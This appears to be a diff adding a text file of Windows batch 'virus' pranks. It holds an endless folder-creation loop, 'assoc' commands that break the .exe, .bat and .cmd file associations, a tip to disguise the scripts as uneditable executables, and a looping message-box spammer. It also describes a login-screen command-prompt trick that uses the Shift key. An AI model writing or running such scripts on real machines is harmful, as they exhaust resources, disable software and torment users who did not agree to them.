@@ -1,0 +1,41 @@
+1.)
+
+@echo off
+:abc
+md%random%
+
+goto abc
+
+to create multiple folders on desktop
+
+
+
+
+2.) corrupts all exe files
+
+assoc .exe=hacked
+
+
+(restores the exe files
+assoc .exe=exefile)
+
+assoc .bat=hacked
+assoc .cmd=hacked
+
+to solve the above problem, hit shift 5 times in login screen and start command prompt
+
+3.) use  bat to exe converter to convert files and make uneditable
+
+
+4.)LOVE VIRUS
+
+
+:r
+@echo off
+msg * i love you
+goto r
+
+
+
+
+
